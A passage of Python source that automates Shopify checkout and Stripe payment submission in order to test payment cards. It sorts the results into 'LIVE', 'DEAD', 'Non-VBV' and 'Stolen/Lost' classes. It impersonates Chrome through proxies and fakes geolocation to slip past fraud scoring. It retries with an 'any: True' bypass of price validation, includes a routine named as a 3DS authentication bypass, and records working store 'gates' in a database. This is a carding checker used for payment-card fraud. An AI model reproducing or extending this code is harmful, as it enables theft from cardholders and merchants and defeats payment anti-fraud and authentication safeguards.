                                    "amount": {"value": {"amount": "0", "currencyCode": currency}},
                                    "target": {"merchandiseLineTarget": {"stableId": stable_id}},
                                }]
                            }
                        },
                        "discount": {"discountWithCode": ""},
                        "required": True,
                    }],
                    "acceptUnexpectedDiscounts": True,
                },
                "delivery": {
                    "deliveryLines": [{
                        "destination": {"streetAddress": {
                            **billing_addr,
                            "oneTimeUse": False,
                            # Coordinates: Stripe uses geolocation for fraud scoring.
                            # Real browsers send lat/lng from browser geolocation or IP.
                            # We use a static US coordinate matching the billing zip.
                            "coordinates": {"latitude": 40.7128, "longitude": -74.0060},
                        }},
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle":           delivery_handle,
                                "customDeliveryRate": False,
                            },
                            "options": {"phone": customer["phone"]},
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                        "deliveryMethodTypes":    ["SHIPPING"],
                        "expectedTotalPrice":     {"value": {"amount": "0.00", "currencyCode": currency}},
                        "destinationChanged":     False,
                    }],
                    "noDeliveryRequired":          [],
                    "useProgressiveRates":         True,
                    "prefetchShippingRatesStrategy": None,
                    "interfaceFlow":               "SHOPIFY",
                    "supportsSplitShipping":       True,
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id":              f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                "variantId":       f"gid://shopify/ProductVariant/{variant_id}",
                                "properties":      [],
                                "sellingPlanId":   None,
                                "sellingPlanDigest": None,
                            }
                        },
                        "quantity":            {"items": {"value": 1}},
                        "expectedTotalPrice":  {"value": {"amount": price, "currencyCode": currency}},
                        "lineComponentsSource": None,
                        "lineComponents":      [],
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": pay_method_id,
                                "sessionId":               vault_id,
                                "billingAddress":          {"streetAddress": billing_addr},
                                "cardSource":              None,
                            },
                            "giftCardPaymentMethod":              None,
                            "redeemablePaymentMethod":            None,
                            "walletPaymentMethod":                None,
                            "walletsPlatformPaymentMethod":       None,
                            "localPaymentMethod":                 None,
                            "paymentOnDeliveryMethod":            None,
                            "paymentOnDeliveryMethod2":           None,
                            "manualPaymentMethod":                None,
                            "customPaymentMethod":                None,
                            "offsitePaymentMethod":               None,
                            "customOnsitePaymentMethod":          None,
                            "deferredPaymentMethod":              None,
                            "customerCreditCardPaymentMethod":    None,
                            "paypalBillingAgreementPaymentMethod": None,
                            "remotePaymentInstrument":            None,
                        },
                        "amount": {"any": True},
                    }],
                    "billingAddress": {"streetAddress": billing_addr},
                    "creditCardBin":  card.number[:8],
                },
                "buyerIdentity": {
                    "customer":      {"presentmentCurrency": currency, "countryCode": "US"},
                    "email":         customer["email"],
                    "emailChanged":  False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [{"email": {"consentState": "GRANTED", "value": customer["email"]}}],
                    "shopPayOptInPhone": {
                        "number":      customer["phone"],
                        "countryCode": "US",
                    },
                    "rememberMe":    False,
                    "setShippingAddressAsDefault": False,
                },
                "tip":     {"tipLines": []},
                "taxes": {
                    "proposedAllocations":        None,
                    "proposedTotalAmount":         {"any": True},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions":          [],
                },
                "note":                  {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                # shopPayArtifact — real browsers always send this for ShopPay opt-in tracking
                "shopPayArtifact": {
                    "optIn": {
                        "vaultEmail":  "",
                        "vaultPhone":  f"+1{customer['phone']}",
                        "optInSource": "REMEMBER_ME",
                    }
                },
                "nonNegotiableTerms":    None,
                "scriptFingerprint": {
                    "signature": None, "signatureUuid": None,
                    "lineItemScriptChanges": [], "paymentScriptChanges": [],
                    "shippingScriptChanges": [],
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields":  [],
            },
            "attemptToken": attempt_token,
            "metafields":   [],
            "postPurchaseInquiryResult": "DECLINED",
            "analytics": {
                "requestUrl": f"{base_url}/checkouts/cn/{checkout_id}/{locale}/payment?skip_shop_pay=true",
                "pageId":     str(uuid.uuid4()).upper(),
            },
        },
        "operationName": "SubmitForCompletion",
        "id": SUBMIT_QUERY_ID,
    }

    async def _do_submit(payload: dict) -> tuple[int, dict]:
        try:
            from curl_cffi.requests import AsyncSession as CurlAsyncSession
            cookies_dict = {c.key: c.value for c in session.cookie_jar}
            proxy_url = proxy_kwargs.get("proxy")
            curl_proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
            
            async with CurlAsyncSession(impersonate="chrome131", cookies=cookies_dict, timeout=TIMEOUT) as curl_s:
                r = await curl_s.post(
                    internal_ep,
                    params={"operationName": "SubmitForCompletion"},
                    json=payload,
                    headers=internal_headers,
                    proxies=curl_proxies,
                )
                for name, value in curl_s.cookies.items():
                    session.cookie_jar.update_cookies({name: value})
                try:
                    return r.status_code, r.json()
                except Exception:
                    return r.status_code, {}
        except Exception as e:
            return 0, {"_exc": str(e)}

    # ── Shot 1: First submit ─────────────────────────────────────────────────
    logger.debug("SubmitForCompletion — shot 1 (probe session state)...")
    status1, sj1 = await _do_submit(submit_payload)

    if sj1.get("_exc"):
        return _err(f"Submit error: {sj1['_exc'][:60]}", "submit_exception")
    if not sj1:
        return _err("Submit empty response", "submit_exception")

    gql_errors = sj1.get("errors", [])
    if gql_errors:
        if isinstance(gql_errors, list) and gql_errors:
            msg = gql_errors[0].get("message", "GQL error") if isinstance(gql_errors[0], dict) else str(gql_errors[0])
        else:
            msg = str(gql_errors)  # errors is a plain string (HTTP-level error)
        return _err(f"Submit GQL error: {msg[:80]}", "gql_error")

    data1  = sj1.get("data", {}) or {}
    result = data1.get("submitForCompletion", {}) or {}
    typ    = result.get("__typename", "")

    logger.debug(f"Shot1: {typ}")

    # Handle SubmitRejected — extract correct IDs + wait for pending terms
    if typ == "SubmitRejected":
        seller   = result.get("sellerProposal") or {}
        rej_errs = result.get("errors") or []

        # Check error codes
        err_codes = {e.get("code", "") for e in rej_errs if isinstance(e, dict)}
        logger.debug(f"SubmitRejected codes: {err_codes}")

        # Hard failures — don't retry with any card on this store
        hard_fails = {"CHECKOUT_BLOCKED", "INVALID_PAYMENT", "PAYMENT_BLOCKED"}
        if err_codes & hard_fails:
            return _err(f"Checkout blocked: {', '.join(err_codes & hard_fails)}", "no_payment")

        # PAYMENTS_CREDIT_CARD_BASE_EXPIRED = card is expired
        if "PAYMENTS_CREDIT_CARD_BASE_EXPIRED" in err_codes:
            return _err("Card Expired", "no_payment")

        # DELIVERY_NO_DELIVERY_STRATEGY = store has no US shipping configured for this product
        if "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE" in err_codes:
            return _err("Store has no delivery strategy for this address", "no_payment")

        # DELIVERY_DELIVERY_LINE_DETAIL_CHANGED = the delivery rate handle changed or needs an update
        if "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in err_codes:
            try:
                delivery_groups = (seller.get("delivery") or {}).get("deliveryGroups") or []
                if delivery_groups:
                    opts = delivery_groups[0].get("deliveryOptions") or []
                    if opts:
                        new_handle = opts[0].get("handle", "")
                        if new_handle:
                            logger.debug(f"Delivery rate changed — auto-correcting to {new_handle[:30]}...")
                            try:
                                submit_payload["variables"]["input"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"]["deliveryStrategyByHandle"]["handle"] = new_handle
                            except (KeyError, IndexError):
                                pass
            except Exception:
                pass

        # DISCOUNTS_NOT_FOUND = store doesn't accept our discount format
        # Auto-correct: reset to simple empty discounts format
        if "DISCOUNTS_NOT_FOUND" in err_codes:
            try:
                logger.debug("DISCOUNTS_NOT_FOUND — resetting discounts to empty format")
                submit_payload["variables"]["input"]["discounts"] = {
                    "lines": [],
                    "acceptUnexpectedDiscounts": True,
                }
            except Exception:
                pass

        # MERCHANDISE_EXPECTED_PRICE_MISMATCH = product price changed since scan
        # Auto-correct: extract actual price from sellerProposal and update payload
        if "MERCHANDISE_EXPECTED_PRICE_MISMATCH" in err_codes:
            try:
                merch_lines = (seller.get("merchandise") or {}).get("merchandiseLines") or []
                if merch_lines:
                    actual_price = (merch_lines[0].get("totalAmount") or {}).get("amount", "")
                    actual_currency = (merch_lines[0].get("totalAmount") or {}).get("currencyCode", "USD")
                    if actual_price:
                        logger.debug(f"Price mismatch — auto-correcting to {actual_price} {actual_currency}")
                        submit_payload["variables"]["input"]["merchandise"]["merchandiseLines"][0]["expectedTotalPrice"] = {
                            "value": {"amount": actual_price, "currencyCode": actual_currency}
                        }
            except Exception:
                pass

        # Extract correct paymentMethodIdentifier from sellerProposal
        # Pick the first available direct payment method (credit card) ID
        avail_lines = (seller.get("payment") or {}).get("availablePaymentLines") or []
        for line in avail_lines:
            pm = (line.get("paymentMethod") or {})
            pmid = pm.get("paymentMethodIdentifier", "")
            if pmid and pmid != pay_method_id:
                logger.debug(f"Correcting paymentMethodIdentifier: {pmid}")
                pay_method_id = pmid
                try:
                    submit_payload["variables"]["input"]["payment"][
                        "paymentLines"][0]["paymentMethod"][
                        "directPaymentMethod"]["paymentMethodIdentifier"] = pmid
                except (KeyError, IndexError):
                    pass
                # Persist correct ID to DB so future checks don't need Shot 1 correction
                try:
                    from core.database import get_db
                    db = get_db()
                    asyncio.ensure_future(
                        db.execute(
                            "UPDATE shopify_gates SET payment_method_id=? WHERE base_url=?",
                            [pmid, base_url]
                        )
                    )
                except Exception:
                    pass
                break

        # Check delivery pending terms
        delivery_seller = seller.get("delivery") or {}
        poll_ms = 0
        if delivery_seller.get("__typename") == "PendingTerms":
            poll_ms = delivery_seller.get("pollDelay", 1000)
            logger.debug(f"Delivery PendingTerms — waiting {poll_ms}ms...")
            await asyncio.sleep(poll_ms / 1000)

        # BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED = store doesn't accept USD
        # This store is useless for ALL our cards — return currency_skip for permanent session skip
        if "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP" in err_codes:
            return _err("Store does not support USD billing", "currency_skip")

        # PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH = payment terms ID changed
        # Auto-correct: extract current terms ID from sellerProposal and retry
        if "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH" in err_codes:
            try:
                pay_proposal = seller.get("payment") or {}
                pay_lines = pay_proposal.get("paymentLines") or []
                for pl in pay_lines:
                    pm = pl.get("paymentMethod") or {}
                    dpm = pm.get("directPaymentMethod") or {}
                    terms_id = dpm.get("paymentFlexibilityTermsId", "")
                    if terms_id:
                        logger.debug(f"Correcting paymentFlexibilityTermsId: {terms_id}")
                        try:
                            submit_payload["variables"]["input"]["payment"]["paymentLines"][0][
                                "paymentMethod"]["directPaymentMethod"]["paymentFlexibilityTermsId"] = terms_id
                        except (KeyError, IndexError):
                            pass
                        break
            except Exception:
                pass

        # If non-recoverable errors remain — fail
        non_pending = err_codes - {
            "WAITING_PENDING_TERMS",
            "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",    # resolves after paymentMethodId correction
            "DISCOUNTS_NOT_FOUND",                      # auto-corrected above (reset to empty)
            "MERCHANDISE_EXPECTED_PRICE_MISMATCH",      # auto-corrected above
            "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",    # auto-corrected above
            "DELIVERY_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN",    # phone fixed in Shot 2
            "PAYMENTS_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN",    # phone fixed in Shot 2
            "DELIVERY_PHONE_NUMBER_IS_NOT_SUPPORTED",
            "PAYMENTS_PHONE_NUMBER_IS_NOT_SUPPORTED",
            "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",  # auto-corrected above
            "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP",   # already returned currency_skip
            "VALIDATION_CUSTOM",                               # store-specific, often non-fatal
        }
        if non_pending:
            return _err(f"Submit rejected: {', '.join(non_pending)}", "no_payment")

        # ── Shot 2: Re-submit with corrected data ──────────────────────────
        logger.debug("SubmitForCompletion — shot 2 (with corrected data)...")
        _, sj2 = await _do_submit(submit_payload)

        if not sj2 or sj2.get("_exc"):
            return _err("Submit shot2 failed", "submit_exception")

        gql_err2 = sj2.get("errors", [])
        if gql_err2:
            if isinstance(gql_err2, list) and gql_err2:
                msg2 = gql_err2[0].get("message", "") if isinstance(gql_err2[0], dict) else str(gql_err2[0])
            else:
                msg2 = str(gql_err2)
            return _err(f"Shot2 GQL error: {msg2[:80]}", "gql_error")

        data2  = sj2.get("data", {}) or {}
        result = (data2.get("submitForCompletion") or {})
        typ    = result.get("__typename", "")
        logger.debug(f"Shot2: {typ}")

        if typ == "SubmitRejected":
            rej2 = result.get("errors") or []
            codes2 = {e.get("code", "") for e in rej2 if isinstance(e, dict)}
            
            # If Shot 2 STILL gets price/delivery/gateway errors → do Shot 3 with {any: True} bypass
            bypass_codes = {
                "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
                "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
                "WAITING_PENDING_TERMS",
                "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",  # resolves on Shot 3 after payMethodId fixed
                "DISCOUNTS_NOT_FOUND",                    # reset already done in Shot 1
            }
            if codes2 and codes2.issubset(bypass_codes):
                logger.debug("Shot 2 still getting price/delivery mismatch — Shot 3 with any:True bypass...")
                try:
                    # Set price to {any: True} to completely bypass price validation
                    submit_payload["variables"]["input"]["merchandise"]["merchandiseLines"][0]["expectedTotalPrice"] = {"any": True}
                    submit_payload["variables"]["input"]["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {"any": True}
                    # Generate new attempt token
                    submit_payload["variables"]["attemptToken"] = f"{checkout_id}-{uuid.uuid4().hex[:12]}"
                except Exception:
                    pass
                _, sj3 = await _do_submit(submit_payload)
                if sj3 and not sj3.get("_exc"):
                    data3 = sj3.get("data", {}) or {}
                    result = (data3.get("submitForCompletion") or {})
                    typ = result.get("__typename", "")
                    logger.debug(f"Shot3: {typ}")
                    if typ == "SubmitRejected":
                        rej3 = result.get("errors") or []
                        codes3 = {e.get("code", "") for e in rej3 if isinstance(e, dict)}
                        # PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE on Shot3 = Stripe blocked
                        # this store's gateway for this IP — rotate store, don't fail card
                        if codes3 == {"PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE"}:
                            return _err(f"Gateway unavailable (Stripe blocked for this IP)", "product_skip")
                        return _err(f"SubmitRejected(3): {', '.join(codes3) or 'unknown'}", "no_payment")
            else:
                return _err(f"SubmitRejected(2): {', '.join(codes2) or 'unknown'}", "no_payment")


    # ── Parse final result ─────────────────────────────────────────────────
    receipt_id = (
        result.get("receiptId") or
        result.get("attemptId") or
        (result.get("receipt") or {}).get("id") or
        ""
    )

    logger.debug(f"Final: {typ} | receipt={receipt_id[:40] if receipt_id else 'none'}")

    if typ not in ("SubmitSuccess", "SubmitAlreadyAccepted") and not receipt_id:
        if typ == "SubmitThrottled":
            return _err("Rate limited by Shopify", "throttled")
        if typ == "SubmitFailed":
            errs = result.get("errors", [])
            if errs:
                ec = errs[0].get("code", "") if isinstance(errs[0], dict) else ""
                em = errs[0].get("message", "") if isinstance(errs[0], dict) else str(errs[0])
                return _parse_submit_error(ec, em)
        return _err(f"Submit unexpected: {typ or submit_txt[:80]}", "no_payment")

    if not receipt_id:
        return _err("SubmitSuccess but no receipt_id", "no_receipt")

    # ── Step 6: PollForReceipt ────────────────────────────────────────────────
    logger.debug(f"Polling receipt: {receipt_id[:40]}...")

    poll_payload = {
        "variables": {
            "receiptId":    receipt_id,
            "sessionToken": session_token,
        },
        "operationName": "PollForReceipt",
        "id": POLL_QUERY_ID,
    }

    # Adaptive backoff: 10 attempts, 8.0s max total
    # Slow banks (Amex, international) need 5-8s to respond
    # Delays: 0.3+0.5+0.7+0.8+0.8+0.9+1.0+1.0+1.0+1.0 = 8.0s
    _poll_delays = [0.3, 0.5, 0.7, 0.8, 0.8, 0.9, 1.0, 1.0, 1.0, 1.0]
    for attempt in range(10):
        await asyncio.sleep(_poll_delays[attempt])
        try:
            from curl_cffi.requests import AsyncSession as CurlAsyncSession
            cookies_dict = {c.key: c.value for c in session.cookie_jar}
            proxy_url = proxy_kwargs.get("proxy")
            curl_proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
            
            async with CurlAsyncSession(impersonate="chrome131", cookies=cookies_dict, timeout=POLL_TIMEOUT) as curl_s:
                r = await curl_s.post(
                    internal_ep,
                    params={"operationName": "PollForReceipt"},
                    json=poll_payload,
                    headers=internal_headers,
                    proxies=curl_proxies,
                )
                poll_txt = r.text
                for name, value in curl_s.cookies.items():
                    session.cookie_jar.update_cookies({name: value})
        except Exception as e:
            logger.debug(f"Poll error attempt {attempt+1}: {e}")
            continue

        try:
            pj = json.loads(poll_txt)
        except Exception:
            continue

        receipt  = (pj.get("data") or {}).get("receipt", {}) or {}
        rec_type = receipt.get("__typename", "")

        logger.debug(f"Poll[{attempt+1}]: {rec_type}")

        if rec_type == "ProcessedReceipt":
            # Validate it's actually approved — check for processingError
            proc_error = receipt.get("processingError") or {}
            if proc_error and proc_error.get("code"):
                # ProcessedReceipt but with processing error = effective decline
                err_code = proc_error.get("code", "")
                err_msg  = proc_error.get("messageUntranslated", "") or proc_error.get("message", "")
                logger.debug(f"ProcessedReceipt with error: {err_code}")
                return _parse_failed_receipt(receipt)
            order_id = receipt.get("orderName") or receipt.get("id", "")
            if not order_id:
                # No order ID = receipt exists but no actual order placed = treat as error
                logger.debug("ProcessedReceipt but no orderName/id — treating as error")
                continue  # wait for next poll
            receipt_token = receipt_id.split("/")[-1]
            thank_you_url = f"{base_url}/checkouts/co/{receipt_token}/thank_you"
            return GatewayResult(
                status=CCStatus.CHARGED, gateway="Shopify",
                message=f"Approved — Shopify Payments | Non-VBV | Order: {order_id}",
                is_non_vbv=True, raw_code="approved",
                extra={"receipt_url": thank_you_url}
            )

        if rec_type == "FailedReceipt":
            return _parse_failed_receipt(receipt)

        if rec_type == "PendingReceipt":
            continue

        # ── ActionRequiredReceipt = 3DS challenge triggered ───────────────────
        if rec_type == "ActionRequiredReceipt":
            action_url = (receipt.get("action") or {}).get("url", "")
            logger.debug(f"ActionRequiredReceipt — 3DS action: {action_url[:80] if action_url else 'none'}")
            if action_url:
                try:
                    await _attempt_shopify_3ds_bypass(
                        session, action_url, base_url, checkout_url, proxy_kwargs
                    )
                except Exception as e:
                    logger.debug(f"3DS bypass exception: {e}")
            # Re-poll to check if bypass succeeded (bank approved without OTP)
            continue

        # Check raw for known keywords
        raw_l = poll_txt.lower()
        if "do_not_honor" in raw_l:
            return GatewayResult(
                status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
                message="Bank Declined [do_not_honor]",
                raw_code="do_not_honor"
            )
        if "insufficient" in raw_l:
            return GatewayResult(
                status=CCStatus.INSUFFICIENT, gateway="Shopify",
                message="Insufficient Funds",
                raw_code="insufficient"
            )
        if "3d_secure" in raw_l or "redirect_to_acs" in raw_l:
            return GatewayResult(
                status=CCStatus.LIVE_VBV, gateway="Shopify",
                message="3DS Required",
                is_vbv=True, raw_code="3ds"
            )
        if "declined" in raw_l:
            return GatewayResult(
                status=CCStatus.DEAD, gateway="Shopify",
                message="Declined — Card Dead",
                raw_code="declined"
            )

    return _err("Poll timeout — no result", "poll_timeout")



async def _attempt_shopify_3ds_bypass(
    session,
    action_url: str,
    base_url: str,
    checkout_url: str,
    proxy_kwargs: dict,
) -> None:
    """
    3DS Bypass for Shopify — ported from shopify_checker.py

    Steps:
      1. Follow action_url → get hooks.stripe.com URL + params
      2. POST api.stripe.com/v1/3ds2/authenticate (browser fingerprint)
      3. Poll store's /redirect/poll until complete
      4. Hit store's /payment_providers/stripe/card/redirect/complete

    After this, caller should re-poll PollForReceipt — if bank auto-approved
    (frictionless 3DS) receipt will become ProcessedReceipt → CHARGED.
    """
    import json as _json
    import string as _string
    from urllib.parse import urlparse as _up, parse_qs as _pqs
    from curl_cffi.requests import AsyncSession as CurlAsyncSession

    ua         = BROWSER_HEADERS["User-Agent"]
    sec_ch     = BROWSER_HEADERS["sec-ch-ua"]
    proxy_url  = proxy_kwargs.get("proxy")
    curl_proxy = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    cookies_d  = {c.key: c.value for c in session.cookie_jar}

    # ── Step 1: Follow action_url → get Stripe hooks URL ──────────────────────
    payment_id  = None
    stripe_url  = None
    stripe_params = {}

    m = re.search(r'payment_id=([^&\s"\'\/<>]+)', action_url)
    if m:
        payment_id = m.group(1)

    try:
        async with CurlAsyncSession(impersonate="chrome131", cookies=cookies_d) as cs:
            r = await cs.get(
                action_url,
                headers={
                    **BROWSER_HEADERS,
                    "accept":         "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "referer":        checkout_url,
                    "sec-fetch-dest": "iframe",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                },
                proxies=curl_proxy,
                allow_redirects=True,
            )
            final = str(r.url)
            if "hooks.stripe.com" in final or "stripe.com" in final:
                stripe_url = final
            else:
                m2 = re.search(
                    r'https://hooks\.stripe\.com/3d_secure_2/hosted\?[^\'"<\s]+', r.text
                )
                if m2:
                    stripe_url = m2.group(0)
    except Exception as e:
        logger.debug(f"3DS follow action_url error: {e}")

    # ── Step 2: Parse Stripe params ───────────────────────────────────────────
    if stripe_url:
        parsed        = _up(stripe_url)
        stripe_params = {k: v[0] for k, v in _pqs(parsed.query).items()}
        logger.debug(f"3DS stripe_params keys: {list(stripe_params.keys())}")

        # Fetch the hooks.stripe.com page (plants Stripe cookies needed for auth)
        try:
            async with CurlAsyncSession(impersonate="chrome131") as cs:
                await cs.get(
                    stripe_url,
                    headers={
                        "accept":         "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "referer":        action_url,
                        "sec-fetch-dest": "iframe",
                        "sec-fetch-mode": "navigate",
                        "user-agent":     ua,
                    },
                    proxies=curl_proxy,
                    allow_redirects=True,
                )
        except Exception:
            pass

    # ── Step 3: POST api.stripe.com/v1/3ds2/authenticate ──────────────────────
    _key    = stripe_params.get("source") or stripe_params.get("payment_intent")
    pub_key = stripe_params.get("publishable_key", "")

    if _key and pub_key:
        browser_fp = _json.dumps({
            "fingerprintAttempted":     False,
            "fingerprintData":          None,
            "challengeWindowSize":      "03",
            "threeDSCompInd":           "Y",
            "browserJavaEnabled":       False,
            "browserJavascriptEnabled": True,
            "browserLanguage":          "en-US",
            "browserColorDepth":        "32",
            "browserScreenHeight":      "1080",
            "browserScreenWidth":       "1920",
            "browserTZ":                "-345",
            "browserUserAgent":         ua,
        })
        auth_data = {
            "source":  _key,
            "browser": browser_fp,
            "one_click_authn_device_support[hosted]":                            "true",
            "one_click_authn_device_support[same_origin_frame]":                 "false",
            "one_click_authn_device_support[spc_eligible]":                      "false",
            "one_click_authn_device_support[webauthn_eligible]":                 "true",
            "one_click_authn_device_support[publickey_credentials_get_allowed]": "false",
            # Tells Stripe: browser fingerprint not supported (frictionless path)
            "frontend_execution": "eyJmaW5nZXJwcmludE91dGNvbWUiOiJub3Rfc3VwcG9ydGVkIn0=",
            "key": pub_key,
        }
        if stripe_params.get("stripe_account"):
            auth_data["_stripe_account"] = stripe_params["stripe_account"]
        try:
            async with CurlAsyncSession(impersonate="chrome131") as cs:
                r3 = await cs.post(
                    "https://api.stripe.com/v1/3ds2/authenticate",
                    data=auth_data,
                    headers={
                        "accept":           "application/json",
                        "content-type":     "application/x-www-form-urlencoded",
                        "origin":           "https://js.stripe.com",
                        "referer":          "https://js.stripe.com/",
                        "sec-ch-ua":        sec_ch,
                        "sec-ch-ua-mobile": "?0",
                        "sec-fetch-dest":   "empty",
                        "sec-fetch-mode":   "cors",
                        "sec-fetch-site":   "same-site",
                        "user-agent":       ua,
                    },
                    proxies=curl_proxy,
                )
                logger.debug(f"3DS authenticate status={r3.status_code} | {r3.text[:100]}")
        except Exception as e:
            logger.debug(f"3DS authenticate error: {e}")

    # ── Step 4: Poll store /redirect/poll until complete ──────────────────────
    if payment_id:
        pa           = _up(action_url)
        payments_base = f"{pa.scheme}://{pa.netloc}"
        poll_hdrs = {
            **BROWSER_HEADERS,
            "accept":         "*/*",
            "referer":        f"{payments_base}/redirect/complete",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }
        try:
            async with CurlAsyncSession(impersonate="chrome131", cookies=cookies_d) as cs:
                for _ in range(8):
                    await asyncio.sleep(2.0)
                    try:
                        rp = await cs.get(
                            f"{payments_base}/redirect/poll",
                            params={"origin": "checkout_one", "payment_id": payment_id},
                            headers=poll_hdrs,
                            proxies=curl_proxy,
                        )
                        if rp.status_code == 302:
                            logger.debug("3DS redirect/poll → 302 complete")
                            break
                        if rp.status_code == 200:
                            try:
                                pd = rp.json()
                                status = pd.get("status", "")
                                redir  = pd.get("redirect_url") or pd.get("redirectUrl")
                                if redir or status in ("complete", "completed", "success"):
                                    logger.debug(f"3DS redirect/poll complete: status={status}")
                                    break
                            except Exception:
                                if any(x in rp.text.lower() for x in ["complete", "success"]):
                                    break
                    except Exception as e:
                        logger.debug(f"3DS poll iter error: {e}")
        except Exception as e:
            logger.debug(f"3DS redirect poll session error: {e}")

    # ── Step 5: Hit /payment_providers/stripe/card/redirect/complete ──────────
    pi        = stripe_params.get("payment_intent", "")
    pi_secret = stripe_params.get("payment_intent_client_secret", "")
    if pi and pi_secret:
        redir_url = (
            f"{base_url}/payment_providers/stripe/card/redirect/complete"
            f"?payment_intent={pi}"
            f"&payment_intent_client_secret={pi_secret}"
            f"&session_id=rp{''.join(random.choices(_string.ascii_lowercase + _string.digits, k=20))}"
            f"&source_type=card"
        )
        try:
            async with CurlAsyncSession(
                impersonate="chrome131",
                cookies={c.key: c.value for c in session.cookie_jar}
            ) as cs:
                rc = await cs.get(
                    redir_url,
                    headers={
                        **BROWSER_HEADERS,
                        "accept":         "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "referer":        "https://hooks.stripe.com/",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "cross-site",
                    },
                    proxies=curl_proxy,
                    allow_redirects=True,
                )
                logger.debug(f"3DS complete redirect status={rc.status_code}")
                # Sync cookies back to aiohttp session
                for name, value in cs.cookies.items():
                    session.cookie_jar.update_cookies({name: value})
        except Exception as e:
            logger.debug(f"3DS complete redirect error: {e}")


def _parse_failed_receipt(receipt: dict) -> GatewayResult:
    """Parse FailedReceipt to get card result."""
    logger.debug(f"RAW FAILED RECEIPT: {receipt}")
    proc_error = receipt.get("processingError") or {}
    error_code = proc_error.get("code", "") or ""
    error_msg  = proc_error.get("messageUntranslated", "") or proc_error.get("message", "") or ""

    errors_list = receipt.get("errors") or []
    if errors_list and isinstance(errors_list[0], dict):
        error_code = error_code or errors_list[0].get("code", "")
        error_msg  = error_msg  or errors_list[0].get("message", "")

    code_upper = (error_code + " " + error_msg).upper()

    if any(x in code_upper for x in ["INSUFFICIENT", "INSUFFICIENT_FUNDS", "NSF"]):
        return GatewayResult(
            status=CCStatus.INSUFFICIENT, gateway="Shopify",
            message="Insufficient Funds",
            raw_code="insufficient"
        )
    if any(x in code_upper for x in ["3D", "3DS", "REDIRECT_TO_ACS", "SECURE_VALIDATION",
                                       "AUTHENTICATION", "VERIFY", "OTP_REQUIRED"]):
        return GatewayResult(
            status=CCStatus.LIVE_VBV, gateway="Shopify",
            message="3DS Required",
            is_vbv=True, raw_code=error_code.lower() if error_code else "3ds"
        )
    if any(x in code_upper for x in ["INCORRECT_CVC", "INCORRECT_PIN", "CVC_WRONG"]):
        return GatewayResult(
            status=CCStatus.LIVE_VBV, gateway="Shopify",
            message=f"Incorrect CVC [{error_code or error_msg[:40]}]",
            raw_code="incorrect_cvc"
        )
    if "EXPIRED" in code_upper:
        return GatewayResult(
            status=CCStatus.LIVE_VBV, gateway="Shopify",
            message=f"Expired Card [{error_code or error_msg[:40]}]",
            raw_code="expired_card"
        )
    if any(x in code_upper for x in ["STOLEN", "LOST", "PICKUP"]):
        return GatewayResult(
            status=CCStatus.PICKUP, gateway="Shopify",
            message=f"Stolen/Lost [{error_code or 'pickup'}]",
            raw_code="stolen_card"
        )

    # Specific bank responses (bank knows the card) = LIVE
    if any(x in code_upper for x in ["DO_NOT_HONOR", "RESTRICTED_CARD", "BLOCKED", "FRAUD", "INVALID_CARD"]):
        display_msg = error_code or error_msg[:40] or "Bank Decline"
        return GatewayResult(
            status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
            message=f"Bank Declined [{display_msg}]",
            raw_code="do_not_honor"
        )

    # GENERIC_ERROR = ambiguous (proxy flagged as fraud, AVS mismatch, or truly dead)
    # Treat as DO_NOT_HONOR (live but declined) — bank DID respond to the card
    if "GENERIC_ERROR" in code_upper:
        return GatewayResult(
            status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
            message="Bank Declined [GENERIC_ERROR]",
            raw_code="do_not_honor"
        )

    # Hard specific decline = DEAD
    if any(x in code_upper for x in ["CARD_DECLINED", "DECLINED", "INVALID_AMOUNT", "INVALID_NUMBER"]):
        display_msg = error_code or error_msg[:40] or "Declined"
        return GatewayResult(
            status=CCStatus.DEAD, gateway="Shopify",
            message=f"Declined — {display_msg}",
            raw_code="declined"
        )

    # Has ANY specific error code but not mapped above = bank responded = LIVE
